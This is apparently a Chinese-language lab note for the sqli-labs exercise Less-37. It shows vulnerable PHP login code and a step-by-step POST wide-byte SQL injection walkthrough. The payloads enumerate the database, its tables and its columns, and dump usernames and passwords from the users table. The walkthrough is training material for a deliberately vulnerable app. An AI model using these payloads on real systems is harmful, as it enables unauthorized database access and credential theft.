---
title: less37
url: https://www.yuque.com/u29002979/ep2zrx/igsfnpppkch9092m
---

```bash
$uname = mysql_real_escape_string($uname1);
$passwd= mysql_real_escape_string($passwd1);

mysql_query("SET NAMES gbk");
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

> mysql\_real\_escape\_string

post型的宽字节注入 <a name="gLILH"></a>

# 宽字节注入

<a name="izUqu"></a>

## 判断字段数

`uname=**汉'** order by 3--+  `
2个字段 <a name="B0iQ5"></a>

## 回显点检查

`uname=汉' union select 1,2--+` <a name="kzUVz"></a>

## 信息收集

主要看用户,数据库版本&#x20;
`uname=汉' union select user(),version()--+`\ <a name="kzVJM"></a>

## 开始注入

```bash
爆破数据库名称
uname=汉' union select 1,database()--+

爆破数据库表名称
uname=汉' union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()--+

爆破字段名称
users的16进制是0x7573657273
uname=汉' union select 1,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+

爆破字段内容
uname=汉' union select 1,(select group_concat(username,0x7e,password) from users)--+
```
